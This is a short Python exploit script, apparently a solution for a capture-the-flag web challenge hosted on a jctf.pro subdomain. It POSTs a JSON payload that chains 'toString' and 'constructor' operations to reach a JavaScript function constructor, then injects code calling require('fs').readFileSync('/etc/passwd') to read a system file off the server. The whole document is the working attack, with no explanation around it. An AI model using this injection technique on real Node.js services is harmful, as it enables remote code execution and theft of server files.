import requests

hash = "wieacvr3f3ljtc4yecentwbryzpje7"
url = "http://{}.njs.web.jctf.pro/".format(hash)


data = [
    {"op": "toString", "x": "constructor"}, 
    {"op": "toString", "x": "constructor"}, 
    {
        "op": "result", 
        "x": "){return require('fs').readFileSync('/etc/passwd')})//", 
        "y": "return this"
    }, 
    {"op": "result"}
]
r = requests.post(url, json=data)
print(r.text)
